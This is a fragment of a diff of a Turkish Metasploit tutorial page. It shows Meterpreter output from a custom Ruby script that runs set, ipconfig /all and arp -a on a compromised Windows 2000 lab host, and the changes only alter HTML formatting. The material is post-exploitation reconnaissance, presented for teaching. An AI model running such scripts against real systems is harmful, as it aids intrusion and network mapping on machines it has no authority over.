-<pre class="wp-block-code"><code lang="bash" class="language-bash"> meterpreter <strong>&gt;</strong> run helloworld3
- <strong>[</strong><strong>*</strong><strong>]</strong> Running Command List ...
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command set
- <strong>[</strong><strong>*</strong><strong>]</strong>     ALLUSERSPROFILE<strong>=</strong>C:\Documents and Settings\All Users
- APPDATA<strong>=</strong>C:\Documents and Settings\P0WN3D\Application Data
- CommonProgramFiles<strong>=</strong>C:\Program Files\Common Files
- COMPUTERNAME<strong>=</strong>TARGET
- ComSpec<strong>=</strong>C:\WINNT\system32\cmd.exe
- HOMEDRIVE<strong>=</strong>C:
- HOMEPATH<strong>=</strong>
- LOGONSERVER<strong>=</strong>TARGET
- NUMBER_OF_PROCESSORS<strong>=</strong>1
- OS<strong>=</strong>Windows_NT
- Os2LibPath<strong>=</strong>C:\WINNT\system32\os2dll;
- Path<strong>=</strong>C:\WINNT\system32;C:\WINNT;C:\WINNT\System32\Wbem
- PATHEXT<strong>=</strong>.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH
- PROCESSOR_ARCHITECTURE<strong>=</strong>x86
- PROCESSOR_IDENTIFIER<strong>=</strong>x86 Family 6 Model 7 Stepping 6, GenuineIntel
- PROCESSOR_LEVEL<strong>=</strong>6
- PROCESSOR_REVISION<strong>=</strong>0706
- ProgramFiles<strong>=</strong>C:\Program Files
- PROMPT<strong>=</strong>$P$G
- SystemDrive<strong>=</strong>C:
- SystemRoot<strong>=</strong>C:\WINNT
- TEMP<strong>=</strong>C:\DOCUME~1\P0WN3D\LOCALS~1\Temp
- TMP<strong>=</strong>C:\DOCUME~1\P0WN3D\LOCALS~1\Temp
- USERDOMAIN<strong>=</strong>TARGET
- USERNAME<strong>=</strong>P0WN3D
- USERPROFILE<strong>=</strong>C:\Documents and Settings\P0WN3D
- windir<strong>=</strong>C:\WINNT
+<pre class="wp-block-code"><code lang="bash" class="language-bash"> meterpreter ***&gt;***  run helloworld3
+ ***[*** ******* ***]***  Running Command List ...
+ ***[*** ******* ***]***      running command set
+ ***[*** ******* ***]***      ALLUSERSPROFILE***=*** C:\Documents and Settings\All Users
+ APPDATA***=*** C:\Documents and Settings\P0WN3D\Application Data
+ CommonProgramFiles***=*** C:\Program Files\Common Files
+ COMPUTERNAME***=*** TARGET
+ ComSpec***=*** C:\WINNT\system32\cmd.exe
+ HOMEDRIVE***=*** C:
+ HOMEPATH***=*** 
+ LOGONSERVER***=*** TARGET
+ NUMBER_OF_PROCESSORS***=*** 1
+ OS***=*** Windows_NT
+ Os2LibPath***=*** C:\WINNT\system32\os2dll;
+ Path***=*** C:\WINNT\system32;C:\WINNT;C:\WINNT\System32\Wbem
+ PATHEXT***=*** .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH
+ PROCESSOR_ARCHITECTURE***=*** x86
+ PROCESSOR_IDENTIFIER***=*** x86 Family 6 Model 7 Stepping 6, GenuineIntel
+ PROCESSOR_LEVEL***=*** 6
+ PROCESSOR_REVISION***=*** 0706
+ ProgramFiles***=*** C:\Program Files
+ PROMPT***=*** $P$G
+ SystemDrive***=*** C:
+ SystemRoot***=*** C:\WINNT
+ TEMP***=*** C:\DOCUME~1\P0WN3D\LOCALS~1\Temp
+ TMP***=*** C:\DOCUME~1\P0WN3D\LOCALS~1\Temp
+ USERDOMAIN***=*** TARGET
+ USERNAME***=*** P0WN3D
+ USERPROFILE***=*** C:\Documents and Settings\P0WN3D
+ windir***=*** C:\WINNT
  
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command ipconfig  /all
- <strong>[</strong><strong>*</strong><strong>]</strong>     
+ ***[*** ******* ***]***      running command ipconfig  /all
+ ***[*** ******* ***]***      
  Windows 2000 IP Configuration
  
  Host Name . . . . . . . . . . . . : target
@@ -9913,18 +10116,18 @@ print_line("This is a line")
  Lease Obtained. . . . . . . . . . : Tuesday, August 25, 2009 10:53:48 PM
  Lease Expires . . . . . . . . . . : Tuesday, August 25, 2009 11:23:48 PM
  
- <strong>[</strong><strong>*</strong><strong>]</strong>     running command arp -a
- <strong>[</strong><strong>*</strong><strong>]</strong>     
+ ***[*** ******* ***]***      running command arp -a
+ ***[*** ******* ***]***      
  Interface: 172.16.104.145 on Interface 0x1000003
  Internet Address      Physical Address      Type
  172.16.104.2          00-50-56-eb-db-06     dynamic   
  172.16.104.150        00-0c-29-a7-f1-c5     dynamic   
  
- meterpreter <strong>&gt;</strong>
+ meterpreter ***&gt;*** 
 </code></pre>
 <!-- /wp:code -->
 <!-- wp:paragraph -->
-<p>Gördüğünüz gibi, Ruby kodlarıyla script oluşturmak aslında çok kolay. İlk başta kodlar biraz karışık gelebilir ancak mevcut koldarı biraz çalıştığınızda aşinalık kazanacaksınız. Devamında yapmanız gereken, kod örneklerinden faydalanarak kendi script dosyanızı oluşturmak ve denemektir.</p>
+<p>Gördüğünüz gibi, Ruby kodlarıyla script oluşturmak aslında çok kolay. İlk başta kodlar biraz karışık gelebilir ancak mevcut koldarı biraz çalıştığınızda aşinalık kazanacaksınız. Devamında yapmanız gereken, kod örneklerinden faydalanarak kendi script dosyanızı oluşturmak ve denemektir.
 
         </div>
         
